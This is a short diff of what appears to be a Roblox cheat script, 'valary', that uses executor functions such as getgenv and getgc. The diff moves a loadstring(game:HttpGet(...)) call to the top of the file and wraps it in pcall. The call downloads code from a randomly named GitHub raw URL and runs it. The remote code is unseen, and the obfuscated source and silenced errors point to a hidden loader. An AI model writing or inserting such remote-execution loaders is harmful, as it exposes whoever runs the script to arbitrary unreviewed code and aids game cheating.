@@ -1,3 +1,9 @@
+print("<?>")
+pcall(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/u20d30a0298t8g983020z020/u20d30a0298t8g983020z020/refs/heads/main/u20d30a0298t8g9ff02039"))()
+end)
+print("</>")
+
 if getgenv().valary_loaded then
     return
 end
@@ -303,12 +309,6 @@ local LoadingTick = os.clock()
 local LocalPlayer = game:GetService("Players").LocalPlayer
 
 local Console_Server = game.PlaceId == 15124180230
-
-print("<?>")
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/u20d30a0298t8g983020z020/u20d30a0298t8g983020z020/refs/heads/main/u20d30a0298t8g9ff02039"))()
-
-print("</>")
 
 local Garbage = getgc(true)
 
